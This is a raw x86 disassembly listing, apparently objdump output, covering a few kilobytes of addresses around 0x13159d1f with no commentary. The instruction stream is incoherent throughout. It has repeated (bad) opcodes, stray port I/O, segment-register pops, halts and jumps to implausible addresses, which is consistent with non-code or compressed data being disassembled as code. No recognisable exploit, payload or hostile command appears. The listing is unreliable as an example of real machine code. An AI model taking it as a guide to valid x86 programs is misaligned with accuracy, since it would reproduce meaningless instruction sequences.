13159d1f:	a3 1e bc f1 eb       	mov    %eax,0xebf1bc1e
13159d24:	0b f1                	or     %ecx,%esi
13159d26:	5a                   	pop    %edx
13159d27:	0a c8                	or     %al,%cl
13159d29:	21 0b                	and    %ecx,(%ebx)
13159d2b:	ae                   	scas   %es:(%edi),%al
13159d2c:	57                   	push   %edi
13159d2d:	03 14 14             	add    (%esp,%edx,1),%edx
13159d30:	ad                   	lods   %ds:(%esi),%eax
13159d31:	22 f1                	and    %cl,%dh
13159d33:	18 93 04 52 96 30    	sbb    %dl,0x30965204(%ebx)
13159d39:	5d                   	pop    %ebp
13159d3a:	f8                   	clc
13159d3b:	41                   	inc    %ecx
13159d3c:	01 8d 7c 08 52 6f    	add    %ecx,0x6f52087c(%ebp)
13159d42:	fc                   	cld
13159d43:	b9 cc 51 26 7c       	mov    $0x7c2651cc,%ecx
13159d48:	89 df                	mov    %ebx,%edi
13159d4a:	03 04 29             	add    (%ecx,%ebp,1),%eax
13159d4d:	c1 7e 0b 85          	sarl   $0x85,0xb(%esi)
13159d51:	01 f0                	add    %esi,%eax
13159d53:	01 da                	add    %ebx,%edx
13159d55:	ab                   	stos   %eax,%es:(%edi)
13159d56:	e1 56                	loope  0x13159dae
13159d58:	db 08                	fisttpl (%eax)
13159d5a:	93                   	xchg   %eax,%ebx
13159d5b:	17                   	pop    %ss
13159d5c:	9d                   	popf
13159d5d:	f4                   	hlt
13159d5e:	80 f9 1f             	cmp    $0x1f,%cl
13159d61:	e5 e5                	in     $0xe5,%eax
13159d63:	e5 6d                	in     $0x6d,%eax
13159d65:	31 04 0b             	xor    %eax,(%ebx,%ecx,1)
13159d68:	74 3d                	je     0x13159da7
13159d6a:	0c 74                	or     $0x74,%al
13159d6c:	49                   	dec    %ecx
13159d6d:	0d 74 55 65 33       	or     $0x33655574,%eax
13159d72:	0d e5 0e 74 70       	or     $0x70740ee5,%eax
13159d77:	24 80                	and    $0x80,%al
13159d79:	08 11                	or     %dl,(%ecx)
13159d7b:	8d                   	lea    (bad),%ebx
13159d7c:	d8 a3 99 88 85 6d    	fsubs  0x6d858899(%ebx)
13159d82:	89 7f bf             	mov    %edi,-0x41(%edi)
13159d85:	22 12                	and    (%edx),%dl
13159d87:	85 30                	test   %esi,(%eax)
13159d89:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
13159d8a:	91                   	xchg   %eax,%ecx
13159d8b:	27                   	daa
13159d8c:	eb 7d                	jmp    0x13159e0b
13159d8e:	0f f2 e4             	pslld  %mm4,%mm4
13159d91:	61                   	popa
13159d92:	10 2a                	adc    %ch,(%edx)
13159d94:	08 6c 8d 2f          	or     %ch,0x2f(%ebp,%ecx,4)
13159d98:	88 b8 a5 32 14 9e    	mov    %bh,-0x61ebcd5b(%eax)
13159d9e:	10 5b ed             	adc    %bl,-0x13(%ebx)
13159da1:	ec                   	in     (%dx),%al
13159da2:	c9                   	leave
13159da3:	87 35 2c b8 02 03    	xchg   %esi,0x302b82c
13159da9:	17                   	pop    %ss
13159daa:	4c                   	dec    %esp
13159dab:	f0 09 23             	lock or %esp,(%ebx)
13159dae:	30 15 5d 6c a3 bc    	xor    %dl,0xbca36c5d
13159db4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
13159db5:	3b 1f                	cmp    (%edi),%ebx
13159db7:	17                   	pop    %ss
13159db8:	02 3c 6c             	add    (%esp,%ebp,2),%bh
13159dbb:	9b                   	fwait
13159dbc:	ac                   	lods   %ds:(%esi),%al
13159dbd:	bd 3c a0 18 22       	mov    $0x2218a03c,%ebp
13159dc2:	5a                   	pop    %edx
13159dc3:	36 9c                	ss pushf
13159dc5:	88 3c ac             	mov    %bh,(%esp,%ebp,4)
13159dc8:	9d                   	popf
13159dc9:	11 1f                	adc    %ebx,(%edi)
13159dcb:	12 35 80 1a 78 57    	adc    0x57781a80,%dh
13159dd1:	29 5b 22             	sub    %ebx,0x22(%ebx)
13159dd4:	4d                   	dec    %ebp
13159dd5:	0f 85 14 e5 59 c4    	jne    0xd76f82ef
13159ddb:	da 56 e0             	ficoml -0x20(%esi)
13159dde:	e9 c1 18 ea e8       	jmp    0xfbffb6a4
13159de3:	05 33 96 51 67       	add    $0x67519633,%eax
13159de8:	16                   	push   %ss
13159de9:	3c cf                	cmp    $0xcf,%al
13159deb:	64 6f                	outsl  %fs:(%esi),(%dx)
13159ded:	ff 14 8a             	call   *(%edx,%ecx,4)
13159df0:	0f f6 43 52          	psadbw 0x52(%ebx),%mm0
13159df4:	61                   	popa
13159df5:	85 1c 32             	test   %ebx,(%edx,%esi,1)
13159df8:	f2 7d 91             	bnd jge 0x13159d8c
13159dfb:	9c                   	pushf
13159dfc:	2e 43                	cs inc %ebx
13159dfe:	ac                   	lods   %ds:(%esi),%al
13159dff:	a1 38 16 f5 a1       	mov    0xa1f51638,%eax
13159e04:	8c 27                	mov    %fs,(%edi)
13159e06:	39 c8                	cmp    %ecx,%eax
13159e08:	ee                   	out    %al,(%dx)
13159e09:	4d                   	dec    %ebp
13159e0a:	75 ee                	jne    0x13159dfa
13159e0c:	16                   	push   %ss
13159e0d:	31 a7 2a 08 eb 7a    	xor    %esp,0x7aeb082a(%edi)
13159e13:	cf                   	iret
13159e14:	b2 c5                	mov    $0xc5,%dl
13159e16:	0e                   	push   %cs
13159e17:	c7                   	(bad)
13159e18:	fe                   	(bad)
13159e19:	13 10                	adc    (%eax),%edx
13159e1b:	10 66 be             	adc    %ah,-0x42(%esi)
13159e1e:	f0 36 74 e2          	lock ss je 0x13159e04
13159e22:	4f                   	dec    %edi
13159e23:	98                   	cwtl
13159e24:	39 02                	cmp    %eax,(%edx)
13159e26:	1c 93                	sbb    $0x93,%al
13159e28:	08 ff                	or     %bh,%bh
13159e2a:	77 04                	ja     0x13159e30
13159e2c:	bd b7 42 c7 fd       	mov    $0xfdc742b7,%ebp
13159e31:	03 1f                	add    (%edi),%ebx
13159e33:	0d 20 ea eb 45       	or     $0x45ebea20,%eax
13159e38:	17                   	pop    %ss
13159e39:	37                   	aaa
13159e3a:	36 c4 0a             	les    %ss:(%edx),%ecx
13159e3d:	da f8                	(bad)
13159e3f:	c4 47 01             	les    0x1(%edi),%eax
13159e42:	2c 38                	sub    $0x38,%al
13159e44:	02 9e b9 d8 da 03    	add    0x3dad8b9(%esi),%bl
13159e4a:	74 03                	je     0x13159e4f
13159e4c:	1c e5                	sbb    $0xe5,%al
13159e4e:	ac                   	lods   %ds:(%esi),%al
13159e4f:	65 36 9c             	gs ss pushf
13159e52:	98                   	cwtl
13159e53:	e1 bd                	loope  0x13159e12
13159e55:	4b                   	dec    %ebx
13159e56:	14 13                	adc    $0x13,%al
13159e58:	30 09                	xor    %cl,(%ecx)
13159e5a:	15 49 17 ae 77       	adc    $0x77ae1749,%eax
13159e5f:	ec                   	in     (%dx),%al
13159e60:	ad                   	lods   %ds:(%esi),%eax
13159e61:	a4                   	movsb  %ds:(%esi),%es:(%edi)
13159e62:	13 11                	adc    (%ecx),%edx
13159e64:	4d                   	dec    %ebp
13159e65:	b4 86                	mov    $0x86,%ah
13159e67:	dc 55 fc             	fcoml  -0x4(%ebp)
13159e6a:	b0 5c                	mov    $0x5c,%al
13159e6c:	f7 32                	divl   (%edx)
13159e6e:	18 36                	sbb    %dh,(%esi)
13159e70:	b8 b4 d0 09 c9       	mov    $0xc909d0b4,%eax
13159e75:	b0 09                	mov    $0x9,%al
13159e77:	97                   	xchg   %eax,%edi
13159e78:	5c                   	pop    %esp
13159e79:	09 8a 58 da a5 8d    	or     %ecx,-0x725a25a8(%edx)
13159e7f:	df 07                	filds  (%edi)
13159e81:	79 0a                	jns    0x13159e8d
13159e83:	f7 da                	neg    %edx
13159e85:	f7 81 da 58 cf 01 19 	testl  $0x96368319,0x1cf58da(%ecx)
13159e8c:	83 36 96 
13159e8f:	ef                   	out    %eax,(%dx)
13159e90:	0d d9 f7 db 83       	or     $0x83dbf7d9,%eax
13159e95:	d9 f7                	fincstp
13159e97:	ee                   	out    %al,(%dx)
13159e98:	cd 12                	int    $0x12
13159e9a:	f6 02 ff             	testb  $0xff,(%edx)
13159e9d:	dd 39                	fnstsw (%ecx)
13159e9f:	31 f6                	xor    %esi,%esi
13159ea1:	d1 e0                	shl    $1,%eax
13159ea3:	d1 d2                	rcl    $1,%edx
13159ea5:	d1 d6                	rcl    $1,%esi
13159ea7:	d1 be ef 72 0b b3    	sarl   $1,-0x4cf48d11(%esi)
13159ead:	6b 9c fe ff 39 de 72 	imul   $0x5,0x72de39ff(%esi,%edi,8),%ebx
13159eb4:	05 
13159eb5:	29 de                	sub    %ebx,%esi
13159eb7:	19 ef                	sbb    %ebp,%edi
13159eb9:	40                   	inc    %eax
13159eba:	e2 e7                	loop   0x13159ea3
13159ebc:	5b                   	pop    %ebx
13159ebd:	f7 c3 a9 8a 45 5d    	test   $0x5d458aa9,%ebx
13159ec3:	fa                   	cli
13159ec4:	08 04 20             	or     %al,(%eax,%eiz,1)
13159ec7:	08 00                	or     %al,(%eax)
13159ec9:	f7 f3                	div    %ebx
13159ecb:	7c eb                	jl     0x13159eb8
13159ecd:	f3 92                	repz xchg %eax,%edx
13159ecf:	66 02 3b             	data16 add (%ebx),%bh
13159ed2:	af                   	scas   %es:(%edi),%eax
13159ed3:	7b 5d                	jnp    0x13159f32
13159ed5:	59                   	pop    %ecx
13159ed6:	4a                   	dec    %edx
13159ed7:	80 05 99 07 78 9b c2 	addb   $0xc2,0x9b780799
13159ede:	0a 35 b6 ac 7c 92    	or     0x927cacb6,%dh
13159ee4:	7d 9c                	jge    0x13159e82
13159ee6:	ac                   	lods   %ds:(%esi),%al
13159ee7:	13 a8 f2 e7 dc c9    	adc    -0x3623180e(%eax),%ebp
13159eed:	83 7d 5b b7          	cmpl   $0xffffffb7,0x5b(%ebp)
13159ef1:	b6 54                	mov    $0x54,%dh
13159ef3:	65 09 05 21 0f 92 ef 	or     %eax,%gs:0xef920f21
13159efa:	03 21                	add    (%ecx),%esp
13159efc:	57                   	push   %edi
13159efd:	5d                   	pop    %ebp
13159efe:	fd                   	std
13159eff:	0f 9c c0             	setl   %al
13159f02:	88 45 ff             	mov    %al,-0x1(%ebp)
13159f05:	9c                   	pushf
13159f06:	0a 7e 72             	or     0x72(%esi),%bh
13159f09:	75 b7                	jne    0x13159ec2
13159f0b:	76 40                	jbe    0x13159f4d
13159f0d:	34 32                	xor    $0x32,%al
13159f0f:	34 b0                	xor    $0xb0,%al
13159f11:	7d 07                	jge    0x13159f1a
13159f13:	4b                   	dec    %ebx
13159f14:	d2 61 df             	shlb   %cl,-0x21(%ecx)
13159f17:	6d                   	insl   (%dx),%es:(%edi)
13159f18:	b4 44                	mov    $0x44,%ah
13159f1a:	da 29                	fisubrl (%ecx)
13159f1c:	30 07                	xor    %al,(%edi)
13159f1e:	88 44 1d df          	mov    %al,-0x21(%ebp,%ebx,1)
13159f22:	43                   	inc    %ebx
13159f23:	24 9f                	and    $0x9f,%al
13159f25:	b1 b2                	mov    $0xb2,%cl
13159f27:	3d 31 b8 89 0a       	cmp    $0xa89b831,%eax
13159f2c:	89 4e c0             	mov    %ecx,-0x40(%esi)
13159f2f:	75 ba                	jne    0x13159eeb
13159f31:	82 ee 36             	sub    $0x36,%dh
13159f34:	e0 80                	loopne 0x13159eb6
13159f36:	7d ff                	jge    0x13159f37
13159f38:	1e                   	push   %ds
13159f39:	c6                   	(bad)
13159f3a:	2b 2d 43 81 23 de    	sub    0xde238143,%ebp
13159f40:	42                   	inc    %edx
13159f41:	60                   	pusha
13159f42:	79 ad                	jns    0x13159ef1
13159f44:	bf 06 ef 6d 47       	mov    $0x476def06,%edi
13159f49:	df d0                	(bad)
13159f4b:	e4 d3                	in     $0xd3,%al
13159f4d:	3b d0                	cmp    %eax,%edx
13159f4f:	7c 09                	jl     0x13159f5a
13159f51:	73 20                	jae    0x13159f73
13159f53:	40                   	inc    %eax
13159f54:	08 4b d0             	or     %cl,-0x30(%ebx)
13159f57:	de c0                	faddp  %st,%st(0)
13159f59:	7d f7                	jge    0x13159f52
13159f5b:	ed                   	in     (%dx),%eax
13159f5c:	0d 4b 8a 54 2d       	or     $0x2d548a4b,%eax
13159f61:	f8                   	clc
13159f62:	40                   	inc    %eax
13159f63:	77 04                	ja     0x13159f69
13159f65:	be 10 01 f3 8b       	mov    $0x8bf30110,%esi
13159f6a:	d0 4a 63             	rorb   $1,0x63(%edx)
13159f6d:	16                   	push   %ss
13159f6e:	28 c3                	sub    %al,%bl
13159f70:	15 08 06 6f 8b       	adc    $0x8b6f0608,%eax
13159f75:	e5 c5                	in     $0xc5,%eax
13159f77:	af                   	scas   %es:(%edi),%eax
13159f78:	73 af                	jae    0x13159f29
13159f7a:	c1 d6 4c             	rcl    $0x4c,%esi
13159f7d:	01 02                	add    %eax,(%edx)
13159f7f:	7b d3                	jnp    0x13159f54
13159f81:	34 a1                	xor    $0xa1,%al
13159f83:	18 ee                	sbb    %ch,%dh
13159f85:	00 b1 b0 e2 57 15    	add    %dh,0x1557e2b0(%ecx)
13159f8b:	3d cb f1 7a 80       	cmp    $0x807af1cb,%eax
13159f90:	2b e9                	sub    %ecx,%ebp
13159f92:	66 e7 37             	out    %ax,$0x37
13159f95:	14 98                	adc    $0x98,%al
13159f97:	31 17                	xor    %edx,(%edi)
13159f99:	07                   	pop    %es
13159f9a:	fb                   	sti
13159f9b:	e0 df                	loopne 0x13159f7c
13159f9d:	d6                   	salc
13159f9e:	51                   	push   %ecx
13159f9f:	c3                   	ret
13159fa0:	fc                   	cld
13159fa1:	53                   	push   %ebx
13159fa2:	5b                   	pop    %ebx
13159fa3:	5d                   	pop    %ebp
13159fa4:	02 1b                	add    (%ebx),%bl
13159fa6:	c4 38                	les    (%eax),%edi
13159fa8:	7a ec                	jp     0x13159f96
13159faa:	e0 06                	loopne 0x13159fb2
13159fac:	58                   	pop    %eax
13159fad:	7f 1a                	jg     0x13159fc9
13159faf:	8f 07                	pop    (%edi)
13159fb1:	b0 7c                	mov    $0x7c,%al
13159fb3:	c0 ee 60             	shr    $0x60,%dh
13159fb6:	64 ca 77 33          	fs lret $0x3377
13159fba:	a4                   	movsb  %ds:(%esi),%es:(%edi)
13159fbb:	43                   	inc    %ebx
13159fbc:	35 2f 29 70 00       	xor    $0x70292f,%eax
13159fc1:	4d                   	dec    %ebp
13159fc2:	c7                   	(bad)
13159fc3:	f0 f8                	lock clc
13159fc5:	bc 2d 70 cd 55       	mov    $0x55cd702d,%esp
13159fca:	67 0b 07             	or     (%bx),%eax
13159fcd:	a3 60 db 36 f0       	mov    %eax,0xf036db60
13159fd2:	46                   	inc    %esi
13159fd3:	01 01                	add    %eax,(%ecx)
13159fd5:	c6                   	(bad)
13159fd6:	ee                   	out    %al,(%dx)
13159fd7:	50                   	push   %eax
13159fd8:	02 f9                	add    %cl,%bh
13159fda:	e8 05 06 0b 6c       	call   0x7f20a5e4
13159fdf:	d5 66                	aad    $0x66
13159fe1:	d8 1d 32 eb f6 f4    	fcomps 0xf4f6eb32
13159fe7:	f7 fb                	idiv   %ebx
13159fe9:	16                   	push   %ss
13159fea:	6c                   	insb   (%dx),%es:(%edi)
13159feb:	db 6d e8             	fldt   -0x18(%ebp)
13159fee:	26 e4 46             	es in  $0x46,%al
13159ff1:	e4 d0                	in     $0xd0,%al
13159ff3:	3b 45 e8             	cmp    -0x18(%ebp),%eax
13159ff6:	74 58                	je     0x1315a050
13159ff8:	52                   	push   %edx
13159ff9:	9f                   	lahf
13159ffa:	da 0e                	fimull (%esi)
13159ffc:	83 11 08             	adcl   $0x8,(%ecx)
13159fff:	23 83 3b 86 a0 89    	and    -0x765f79c5(%ebx),%eax
1315a005:	0d fe 35 89 5d       	or     $0x5d8935fe,%eax
1315a00a:	e0 3b                	loopne 0x1315a047
1315a00c:	7d 32                	jge    0x1315a040
1315a00e:	1d fc 19 da 2e       	sbb    $0x2eda19fc,%eax
1315a013:	11 86 76 50 0f af    	adc    %eax,-0x50f0af8a(%esi)
1315a019:	4a                   	dec    %edx
1315a01a:	03 b0 d1 d9 b7 17    	add    0x17b7d9d1(%eax),%esi
1315a020:	4d                   	dec    %ebp
1315a021:	f0 2b cf             	lock sub %edi,%ecx
1315a024:	80 9c dd e0 e0 be b5 	sbbb   $0xb7,-0x4a411f20(%ebp,%ebx,8)
1315a02b:	b7 
1315a02c:	63 e4                	arpl   %esp,%esp
1315a02e:	3c 5c                	cmp    $0x5c,%al
1315a030:	2f                   	das
1315a031:	eb 5e                	jmp    0x1315a091
1315a033:	ff 0b                	decl   (%ebx)
1315a035:	55                   	push   %ebp
1315a036:	6d                   	insl   (%dx),%es:(%edi)
1315a037:	6b 0e 1e             	imul   $0x1e,(%esi),%ecx
1315a03a:	91                   	xchg   %eax,%ecx
1315a03b:	7a 89                	jp     0x13159fc6
1315a03d:	65 ec                	gs in  (%dx),%al
1315a03f:	43                   	inc    %ebx
1315a040:	7b 5b                	jnp    0x1315a09d
1315a042:	d7                   	xlat   %ds:(%ebx)
1315a043:	da ec                	(bad)
1315a045:	7d 94                	jge    0x13159fdb
1315a047:	04 46                	add    $0x46,%al
1315a049:	2a 2a                	sub    (%edx),%ch
1315a04b:	ec                   	in     (%dx),%al
1315a04c:	42                   	inc    %edx
1315a04d:	4d                   	dec    %ebp
1315a04e:	6a 13                	push   $0x13
1315a050:	23 15 2d 1a 3b ec    	and    0xec3b1a2d,%edx
1315a056:	50                   	push   %eax
1315a057:	eb e2                	jmp    0x1315a03b
1315a059:	3b 7b 3d             	cmp    0x3d(%ebx),%edi
1315a05c:	12 62 ce             	adc    -0x32(%edx),%ah
1315a05f:	55                   	push   %ebp
1315a060:	8c 15 4d 29 78 85    	mov    %ss,0x8578294d
1315a066:	56                   	push   %esi
1315a067:	b0 4d                	mov    $0x4d,%al
1315a069:	e8 a1 3b ee 99       	call   0xad03dc0f
1315a06e:	cc                   	int3
1315a06f:	46                   	inc    %esi
1315a070:	93                   	xchg   %eax,%ebx
1315a071:	60                   	pusha
1315a072:	de 01                	fiadds (%ecx)
1315a074:	36 16                	ss push %ss
1315a076:	db e0                	fneni(8087 only)
1315a078:	4a                   	dec    %edx
1315a079:	df 04 a4             	filds  (%esp,%eiz,4)
1315a07c:	55                   	push   %ebp
1315a07d:	f0 4f                	lock dec %edi
1315a07f:	c2 2a 04             	ret    $0x42a
1315a082:	bb b5 06 6c 03       	mov    $0x36c06b5,%ebx
1315a087:	c3                   	ret
1315a088:	53                   	push   %ebx
1315a089:	e1 0b                	loope  0x1315a096
1315a08b:	0b 6f b7             	or     -0x49(%edi),%ebp
1315a08e:	46                   	inc    %esi
1315a08f:	7e 2e                	jle    0x1315a0bf
1315a091:	cc                   	int3
1315a092:	08 04 ff             	or     %al,(%edi,%edi,8)
1315a095:	4a                   	dec    %edx
1315a096:	4f                   	dec    %edi
1315a097:	38 7c 95 ad          	cmp    %bh,-0x53(%ebp,%edx,4)
1315a09b:	6c                   	insb   (%dx),%es:(%edi)
1315a09c:	d1 22                	shll   $1,(%edx)
1315a09e:	47                   	inc    %edi
1315a09f:	07                   	pop    %es
1315a0a0:	00 6d 08             	add    %ch,0x8(%ebp)
1315a0a3:	67 05 a2 b4 0a 8d    	addr16 add $0x8d0ab4a2,%eax
1315a0a9:	77 58                	ja     0x1315a103
1315a0ab:	c2 ac 86             	ret    $0x86ac
1315a0ae:	09 bb b7 ff 0f 4f    	or     %edi,0x4f0fffb7(%ebx)
1315a0b4:	75 e6                	jne    0x1315a09c
1315a0b6:	64 89 18             	mov    %ebx,%fs:(%eax)
1315a0b9:	ca 9c 01             	lret   $0x19c
1315a0bc:	0d 77 e8 54 83       	or     $0x8354e877,%eax
1315a0c1:	04 5e                	add    $0x5e,%al
1315a0c3:	1d 93 7c a9 49       	sbb    $0x49a97c93,%eax
1315a0c8:	7d 3f                	jge    0x1315a109
1315a0ca:	33 77 1c             	xor    0x1c(%edi),%esi
1315a0cd:	49                   	dec    %ecx
1315a0ce:	f8                   	clc
1315a0cf:	75 27                	jne    0x1315a0f8
1315a0d1:	3d 3c ab 05 47       	cmp    $0x4705ab3c,%eax
1315a0d6:	fa                   	cli
1315a0d7:	54                   	push   %esp
1315a0d8:	11 56 0e             	adc    %edx,0xe(%esi)
1315a0db:	55                   	push   %ebp
1315a0dc:	30 e8                	xor    %ch,%al
1315a0de:	0c 47                	or     $0x47,%al
1315a0e0:	22 07                	and    (%edi),%al
1315a0e2:	39 75 00             	cmp    %esi,0x0(%ebp)
1315a0e5:	b3 c0                	mov    $0xc0,%bl
1315a0e7:	be 1a 4b 18 b2       	mov    $0xb2184b1a,%esi
1315a0ec:	35 9c c0 20 ce       	xor    $0xce20c09c,%eax
1315a0f1:	57                   	push   %edi
1315a0f2:	14 3e                	adc    $0x3e,%al
1315a0f4:	4b                   	dec    %ebx
1315a0f5:	11 de                	adc    %ebx,%esi
1315a0f7:	a0 d4 0e bc 8c       	mov    0x8cbc0ed4,%al
1315a0fc:	ff 43 f8             	incl   -0x8(%ebx)
1315a0ff:	f7 66 51             	mull   0x51(%esi)
1315a102:	ab                   	stos   %eax,%es:(%edi)
1315a103:	42                   	inc    %edx
1315a104:	75 26                	jne    0x1315a12c
1315a106:	df 2c da             	fildll (%edx,%ebx,8)
1315a109:	f0 20 b7 f6 a1 30 e3 	lock and %dh,-0x1ccf5e0a(%edi)
1315a110:	c9                   	leave
1315a111:	af                   	scas   %es:(%edi),%eax
1315a112:	36 5c                	ss pop %esp
1315a114:	c5 a1 39 83 e7 45    	lds    0x45e78339(%ecx),%esp
1315a11a:	39 a4 b8 3b 5d f8 a8 	cmp    %esp,-0x5707a2c5(%eax,%edi,4)
1315a121:	ff 53 04             	call   *0x4(%ebx)
1315a124:	20 0a                	and    %cl,(%edx)
1315a126:	58                   	pop    %eax
1315a127:	59                   	pop    %ecx
1315a128:	38 c5                	cmp    %al,%ch
1315a12a:	16                   	push   %ss
1315a12b:	27                   	daa
1315a12c:	f8                   	clc
1315a12d:	38 1b                	cmp    %bl,(%ebx)
1315a12f:	34 81                	xor    $0x81,%al
1315a131:	38 75 c7             	cmp    %dh,-0x39(%ebp)
1315a134:	84 0b                	test   %cl,(%ebx)
1315a136:	15 46 f0 4e d1       	adc    $0xd14ef046,%eax
1315a13b:	2c c0                	sub    $0xc0,%al
1315a13d:	f9                   	stc
1315a13e:	06                   	push   %es
1315a13f:	13 04 d9             	adc    (%ecx,%ebx,8),%eax
1315a142:	14 6e                	adc    $0x6e,%al
1315a144:	66 88 7c 46 21       	data16 mov %bh,0x21(%esi,%eax,2)
1315a149:	d4 18                	aam    $0x18
1315a14b:	3c 63                	cmp    $0x63,%al
1315a14d:	40                   	inc    %eax
1315a14e:	c2 a8 11             	ret    $0x11a8
1315a151:	22 34 de             	and    (%esi,%ebx,8),%dh
1315a154:	e7 83                	out    %eax,$0x83
1315a156:	46                   	inc    %esi
1315a157:	3b 05 38 d2 86 17    	cmp    0x1786d238,%eax
1315a15d:	5c                   	pop    %esp
1315a15e:	bc c7 44 eb 1f       	mov    $0x1feb44c7,%esp
1315a163:	a1 06 c0 a7 10       	mov    0x10a7c006,%eax
1315a168:	3b eb                	cmp    %ebx,%ebp
1315a16a:	22 94 0a bc a2 c1 8d 	and    -0x723e5d44(%edx,%ecx,1),%dl
1315a171:	06                   	push   %es
1315a172:	21 36                	and    %esi,(%esi)
1315a174:	58                   	pop    %eax
1315a175:	6d                   	insl   (%dx),%es:(%edi)
1315a176:	44                   	inc    %esp
1315a177:	e8 ea eb c2 7f       	call   0x92d88d66
1315a17c:	da 60 c2             	fisubl -0x3e(%eax)
1315a17f:	6a b7                	push   $0xffffffb7
1315a181:	8b 4c 50 bb          	mov    -0x45(%eax,%edx,2),%ecx
1315a185:	05 5d 2c b7 15       	add    $0x15b72c5d,%eax
1315a18a:	19 48 02             	sbb    %ecx,0x2(%eax)
1315a18d:	52                   	push   %edx
1315a18e:	10 02                	adc    %al,(%edx)
1315a190:	5a                   	pop    %edx
1315a191:	b4 70                	mov    $0x70,%ah
1315a193:	04 58                	add    $0x58,%al
1315a195:	64 8f                	fs (bad)
1315a197:	9c                   	pushf
1315a198:	b5 43                	mov    $0x43,%ch
1315a19a:	e0 de                	loopne 0x1315a17a
1315a19c:	e4 8b                	in     $0x8b,%al
1315a19e:	01 51 20             	add    %edx,0x20(%ecx)
1315a1a1:	b4 4f                	mov    $0x4f,%ah
1315a1a3:	88 23                	mov    %ah,(%ebx)
1315a1a5:	04 2b                	add    $0x2b,%al
1315a1a7:	a0 0e 1f f0 53       	mov    0x53f01f0e,%al
1315a1ac:	7f c8                	jg     0x1315a176
1315a1ae:	af                   	scas   %es:(%edi),%eax
1315a1af:	d0 5c f1 b8          	rcrb   $1,-0x48(%ecx,%esi,8)
1315a1b3:	32 47 6a             	xor    0x6a(%edi),%al
1315a1b6:	07                   	pop    %es
1315a1b7:	8d 55 f5             	lea    -0xb(%ebp),%edx
1315a1ba:	75 c4                	jne    0x1315a180
1315a1bc:	ea d5 52 68 3b cf 91 	ljmp   $0x91cf,$0x3b6852d5
1315a1c3:	f0 6b b1 72 d5 11 b9 	lock imul $0xffffff95,-0x46ee2a8e(%ecx),%esi
1315a1ca:	95 
1315a1cb:	96                   	xchg   %eax,%esi
1315a1cc:	97                   	xchg   %eax,%edi
1315a1cd:	0f 95 85 b2 e3 fc 92 	setne  -0x6d031c4e(%ebp)
1315a1d4:	1a 60 53             	sbb    0x53(%eax),%ah
1315a1d7:	fc                   	cld
1315a1d8:	34 0f                	xor    $0xf,%al
1315a1da:	01 5c 75 a1          	add    %ebx,-0x5f(%ebp,%esi,2)
1315a1de:	39 47 f0             	cmp    %eax,-0x10(%edi)
1315a1e1:	7c 78                	jl     0x1315a25b
1315a1e3:	8f 85 05 73 7c 8a    	pop    -0x75838cfb(%ebp)
1315a1e9:	47                   	inc    %edi
1315a1ea:	80 1d d0 87 ff 05 a4 	sbbb   $0xa4,0x5ff87d0
1315a1f1:	1f                   	pop    %ds
1315a1f2:	23 b8 9d e2 05 18    	and    0x1805e29d(%eax),%edi
1315a1f8:	48                   	dec    %eax
1315a1f9:	e0 7c                	loopne 0x1315a277
1315a1fb:	35 05 41 9e 09       	xor    $0x99e4105,%eax
1315a200:	d0 d3                	rcl    $1,%bl
1315a202:	5e                   	pop    %esi
1315a203:	c8 01 06 33          	enter  $0x601,$0x33
1315a207:	93                   	xchg   %eax,%ebx
1315a208:	5f                   	pop    %edi
1315a209:	91                   	xchg   %eax,%ecx
1315a20a:	57                   	push   %edi
1315a20b:	f8                   	clc
1315a20c:	f3 68 b8 fb 77 83    	repz push $0x8377fbb8
1315a212:	2d 42 01 0f 83       	sub    $0x830f0142,%eax
1315a217:	c5 9e c6 05 0c 45    	lds    0x450c05c6(%esi),%ebx
1315a21d:	02 46 6e             	add    0x6e(%esi),%al
1315a220:	01 ac c7 1a 36 d0 00 	add    %ebp,0xd0361a(%edi,%eax,8)
1315a227:	67 0a 8e 6d b4       	or     -0x4b93(%bp),%cl
1315a22c:	41                   	inc    %ecx
1315a22d:	5a                   	pop    %edx
1315a22e:	1c 98                	sbb    $0x98,%al
1315a230:	7c 08                	jl     0x1315a23a
1315a232:	6e                   	outsb  %ds:(%esi),(%dx)
1315a233:	b3 7d                	mov    $0x7d,%bl
1315a235:	d0 c8                	ror    $1,%al
1315a237:	74 66                	je     0x1315a29f
1315a239:	1d 3c b0 d7 08       	sbb    $0x8d7b03c,%eax
1315a23e:	c2 c3 39             	ret    $0x39c3
1315a241:	c8 08 d2 d4          	enter  $0xd208,$0xd4
1315a245:	d3 08                	rorl   %cl,(%eax)
1315a247:	8c aa 07 7d f6 b3    	mov    %gs,-0x4c0982f9(%edx)
1315a24d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315a24e:	01 14 a3             	add    %edx,(%ebx,%eiz,4)
1315a251:	28 09                	sub    %cl,(%ecx)
1315a253:	00 fc                	add    %bh,%ah
1315a255:	25 ce 7f cd be       	and    $0xbecd7fce,%eax
1315a25a:	82 62 2d 10          	andb   $0x10,0x2d(%edx)
1315a25e:	f2 66 83 f8 80       	repnz cmp $0xff80,%ax
1315a263:	21 1a                	and    %ebx,(%edx)
1315a265:	c4 04 76             	les    (%esi,%esi,2),%eax
1315a268:	61                   	popa
1315a269:	cc                   	int3
1315a26a:	7a 3f                	jp     0x1315a2ab
1315a26c:	68 76 40 eb 20       	push   $0x20eb4076
1315a271:	ac                   	lods   %ds:(%esi),%al
1315a272:	b9 c8 a3 14 b9       	mov    $0xb914a3c8,%ecx
1315a277:	bf 90 95 9e 10       	mov    $0x109e9590,%edi
1315a27c:	0e                   	push   %cs
1315a27d:	f4                   	hlt
1315a27e:	a3 20 56 d8 49       	mov    %eax,0x49d85620
1315a283:	54                   	push   %esp
1315a284:	53                   	push   %ebx
1315a285:	d3 28                	shrl   %cl,(%eax)
1315a287:	77 24                	ja     0x1315a2ad
1315a289:	07                   	pop    %es
1315a28a:	45                   	inc    %ebp
1315a28b:	8f                   	(bad)
1315a28c:	0c 32                	or     $0x32,%al
1315a28e:	20 1c 50             	and    %bl,(%eax,%edx,2)
1315a291:	6a 40                	push   $0x40
1315a293:	27                   	daa
1315a294:	13 f1                	adc    %ecx,%esi
1315a296:	d0 3a                	sarb   $1,(%edx)
1315a298:	6c                   	insb   (%dx),%es:(%edi)
1315a299:	f3 b8 e1 17 b3 d0    	repz mov $0xd0b317e1,%eax
1315a29f:	03 7c 11 90          	add    -0x70(%ecx,%edx,1),%edi
1315a2a3:	5c                   	pop    %esp
1315a2a4:	36 1b 94 0e 32 0b 40 	sbb    %ss:-0xbff4ce(%esi,%ecx,1),%edx
1315a2ab:	ff 
